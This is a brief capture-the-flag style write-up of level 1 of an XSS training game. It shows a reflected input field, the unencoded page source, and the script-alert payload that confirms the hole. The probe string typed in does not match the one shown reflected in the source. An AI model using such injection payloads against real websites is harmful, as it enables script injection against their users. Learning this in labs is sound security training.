### **XSSGame Level 1 Writeup**  

After learning about **XSS**, the first step in finding a vulnerability is testing which characters are allowed and bypass the filter.  

In this challenge, we have an **input field**, as shown in the image. 
 ![1-1](https://github.com/user-attachments/assets/2aeaa926-8ea8-4390-9cfc-cf661c996e70)
 
Let's enter the following payload: 


```
eslam"<>
```

Now, we check what gets reflected on the page.  

Looking at the source code, we see that **all the characters we entered were reflected** without any encoding or filtering:  

```html
<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        background-color: #ffffff;
      }
    </style>
    <script src="/static/js/js_frame.js"></script>
  </head>
  <body>
    <center>
      <img src="/static/img/foogle.png">
      <br><br>
      Sorry, no results were found for <b>x"<>;</b>.
      <a href="?">Try again</a>.
      <br>
    </center>
  </body>
</html>
```

Since our input is **reflected**, we can inject a simple XSS payload to trigger an alert box:  

```html
<script>alert()</script>
```

Once executed, an alert box appears, confirming the **XSS vulnerability**, as shown in the image.

![1-2](https://github.com/user-attachments/assets/e85387b5-60b2-451c-8bf5-ae321b63af28)

